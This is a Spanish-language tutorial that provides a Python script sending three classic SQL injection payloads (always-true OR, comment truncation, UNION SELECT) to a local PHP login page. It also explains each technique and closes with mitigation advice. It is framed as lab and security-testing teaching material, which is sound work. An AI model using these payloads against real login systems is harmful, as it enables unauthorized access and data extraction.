# **Ataque de inyección SQL**

Es importante tener en cuenta que este tipo de ejercicio se debe realizar en un entorno controlado y únicamente con fines educativos y de prueba de seguridad, nunca en sistemas de producción o sin la autorización adecuada.

## Advertencia

**Este código es solo para fines educativos en un entorno controlado. Nunca lo utilices en sistemas que no te pertenecen o sin autorización expresa. La inyección SQL es una práctica maliciosa que puede causar daños graves a los sistemas y es ilegal cuando se utiliza en sistemas ajenos.**

## Configuración Previa

Antes de ejecutar el script, asegúrate de tener un entorno de prueba configurado con el código PHP proporcionado y una base de datos MySQL.

### 1. Instalación de Librerías Necesarias

Necesitarás instalar la librería `requests` para realizar las solicitudes HTTP desde Python. Puedes instalarla con el siguiente comando:

```python
pip install requests
```

### 2. Script Python para Realizar Ataques de Inyección SQL

```python
import requests

# URL del script de login.php
url = 'http://localhost/sistema_login/login.php'

# Diccionario para almacenar los resultados de las pruebas
results = {}

# Función para realizar la solicitud POST
def post_request(data):
    try:
        response = requests.post(url, data=data)
        return response.text
    except requests.exceptions.RequestException as e:
        return str(e)

# Técnica 1: Inyección SQL Clásica
def sql_injection_classic():
    payload = "' OR '1'='1"
    data = {
        'nombre_usuario': payload,
        'password': payload
    }
    response = post_request(data)
    results['SQL Injection Clásica'] = response
    return response

# Técnica 2: Inyección SQL con Comentarios
def sql_injection_comments():
    payload = "' OR '1'='1' -- "
    data = {
        'nombre_usuario': payload,
        'password': 'any_password'
    }
    response = post_request(data)
    results['SQL Injection con Comentarios'] = response
    return response

# Técnica 3: Inyección SQL de Unión (UNION)
def sql_injection_union():
    payload = "' UNION SELECT 1,2,3 -- "
    data = {
        'nombre_usuario': payload,
        'password': 'any_password'
    }
    response = post_request(data)
    results['SQL Injection UNION'] = response
    return response

# Ejecutar las pruebas
if __name__ == "__main__":
    print("Realizando ataques de inyección SQL...\n")
    
    print("1. SQL Injection Clásica...")
    print(sql_injection_classic())
    
    print("\n2. SQL Injection con Comentarios...")
    print(sql_injection_comments())
    
    print("\n3. SQL Injection UNION...")
    print(sql_injection_union())
    
    # Guardar resultados en un archivo para su análisis
    with open('sql_injection_results.txt', 'w') as f:
        for technique, result in results.items():
            f.write(f"{technique}:\n{result}\n\n")
    
    print("\nResultados guardados en 'sql_injection_results.txt'.")
```

### Explicación del Código

1. **Librerías Utilizadas**:
   - `requests`: Utilizada para realizar solicitudes HTTP a la página de `login.php` del sistema vulnerable.
2. **Funciones de Inyección SQL**:
   - **`sql_injection_classic()`**: Realiza una inyección SQL clásica utilizando `' OR '1'='1'`. Este payload intenta manipular la consulta SQL para que siempre sea verdadera, permitiendo un inicio de sesión sin credenciales válidas.
   - **`sql_injection_comments()`**: Utiliza comentarios (`--`) para ignorar el resto de la consulta SQL, lo que permite omitir la parte de la contraseña.
   - **`sql_injection_union()`**: Intenta utilizar la técnica UNION para combinar los resultados de una segunda consulta con la original. Este payload es más avanzado y puede usarse para extraer información adicional.
3. **Función `post_request(data)`**:
   - Esta función toma un diccionario `data` con los datos del formulario (nombre de usuario y contraseña) y realiza una solicitud POST al script `login.php`.
4. **Ejecución y Resultados**:
   - Cada técnica de inyección SQL se ejecuta y el resultado se almacena en el diccionario `results`.
   - Los resultados de las pruebas se guardan en un archivo `sql_injection_results.txt` para su posterior análisis.

### 3. Ejecución del Script

Puedes ejecutar el script en un entorno Python con:

```bash
python sql_injection_test.py
```

### 4. Interpretación de Resultados

Después de ejecutar el script:

- **SQL Injection Clásica**: Si la inyección es exitosa, el sistema debería permitir el inicio de sesión sin credenciales válidas.
- **SQL Injection con Comentarios**: Similar a la clásica, pero utilizando comentarios para truncar la consulta.
- **SQL Injection UNION**: Intentará extraer información adicional usando la cláusula UNION.

### 5. Mitigación de Vulnerabilidades

Para evitar que un sistema sea vulnerable a estos ataques, se deben seguir las mejores prácticas de seguridad:

- **Usar Sentencias Preparadas (Prepared Statements)**: Esto separa los datos del código SQL, previniendo la inyección.
- **Validar y Sanitizar Entradas**: Asegúrate de que todos los datos de entrada sean validados y sanitizados adecuadamente.
- **Principio de Menor Privilegio**: Configura los permisos de la base de datos para limitar el acceso de las cuentas de usuario solo a lo necesario.